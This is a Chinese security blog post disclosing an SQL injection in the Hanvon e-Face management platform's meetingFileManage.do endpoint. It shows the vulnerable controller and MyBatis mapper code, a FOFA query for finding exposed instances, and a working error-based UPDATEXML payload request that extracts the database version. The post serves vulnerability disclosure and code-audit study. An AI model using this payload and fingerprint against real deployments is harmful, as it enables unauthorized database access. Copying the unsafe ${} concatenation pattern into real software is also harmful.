---
title: "汉王e脸通综合管理平台 meetingFileManage.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-meetingFileManage-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-meetingfilemanage.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 meetingFileManage.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/5 08:26
- 613浏览
- [0评论](#comment)
- 43分钟阅读

深入探索

数据库

身份验证

安全

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `meetingFileManage.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

云安全解决方案

安全运维咨询

Web安全书籍

直接看 `MobiMeetingAppController` 里关于 `meetingFileManage` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/meetingFileManage.do"},
        method = {RequestMethod.GET}
    )
    public MethodResult meetingFileManage(@RequestParam(required = false,value = "keys") String keys, @RequestParam(required = false,value = "fileName") String fileName, @RequestParam(required = false,value = "begin") String begin, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order, @RequestHeader(required = false,value = "token") String token) {
        new MethodResult();
        MethodResult rst = this.getTokenUser(token);
        if (rst.isSuccess()) {
            UserTpm user = (UserTpm)rst.getResult();

            MethodResult methodResult;
            try {
                if (page == null) {
                    page = Constants.DEFAULT_START_PAGE_INDEX;
                }

                if (pageSize == null) {
                    pageSize = Constants.PAGE_SIZE;
                }

                MeetingFileParam param = new MeetingFileParam();
                param.setBegin(begin);
                param.setEnd(end);
                param.setKeys(keys);
                param.setFileName(fileName);
                param.setColumnKey(columnKey);
                param.setOrder(order);
                PageHelper.startPage(page, pageSize);
                param.setUserId(user.getId());
                List<MeetingFile> list = this.meetingAsm.meetingFileManageForPersonal(param);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingFileDsm.xml

代码安全审计

```
<!--个人会议附件列表管理-->
  <select id="meetingFileManageForPersonal" parameterType="com.hanvon.iface.tpm.meeting.param.MeetingFileParam" resultMap="BaseResultMap">
    SELECT MMF.ID, MMF.MT_ID, MMF.MF_NAME, MMF.MF_FILE_PATH, MMF.MF_CREATE_TIME,MMF.MF_CREATE_ID,
    MT.MT_NAME,MT.MT_CONTENT,MT.MT_DATE,MT.MT_START_TIME,MT.MT_END_TIME,MT.MT_CREATE_ID,SU.SZ_NAME as mtCreateName,sys_user.SZ_NAME as mfCreateName,
    sb.sz_name as branchName
    FROM mt_meeting_file MMF
    LEFT JOIN  mt_meeting MT ON MMF.MT_ID = MT.ID
    LEFT JOIN sys_user_sys SU ON MT.MT_CREATE_ID = SU.NG_ID
    LEFT JOIN sys_user_sys sys_user ON MMF.MF_CREATE_ID = sys_user.NG_ID
    LEFT JOIN sys_branch sb on sb.ng_id = (SELECT sub.ng_branch_id from sys_user_branch sub where sub.ng_user_id =MT.MT_CREATE_ID )
    WHERE 1=1
    AND (MMF.MT_ID in (SELECT me.mt_id from mt_meeting_employee me where me.me_id=#{userId})
         or MMF.mf_create_id=#{userId})

    <if test="fileName != null and fileName != ''">
      and MMF.MF_NAME like CONCAT('%',#{fileName},'%')
    </if>
    <if test="keys != null">
      AND (
      sys_user.SZ_NAME  like CONCAT('%',#{keys},'%')
      OR sys_user.sz_employ_id =#{keys}
      )
    </if>
    <if test="begin!= null">
      AND DATE( MMF.MF_CREATE_TIME)  &gt;= DATE(#{begin,jdbcType=VARCHAR})
    </if>
    <if test="end != null">
      AND DATE(#{end,jdbcType=VARCHAR}) &gt;= DATE( MMF.MF_CREATE_TIME)
    </if>
    OR  MT.mt_create_id = #{userId}
    ORDER BY
    <if test="order == null or order == ''">
      MMF.MF_CREATE_TIME desc
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 需要一个合法的 token，参考 [wxLogin.do 信息泄露](https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html)获取

```
GET /manage/mobiMeetingApp/meetingFileManage.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&recordId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
token: xxxxxx
```

[![汉王e脸通综合管理平台 meetingFileManage.do SQL注入漏洞](images/img-001-a51bf4c89ca0.webp)](https://image.mrxn.net/3bb032045475455a8044f7198db52b05.webp)

成功通过报错注入爆出数据库版本信息

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
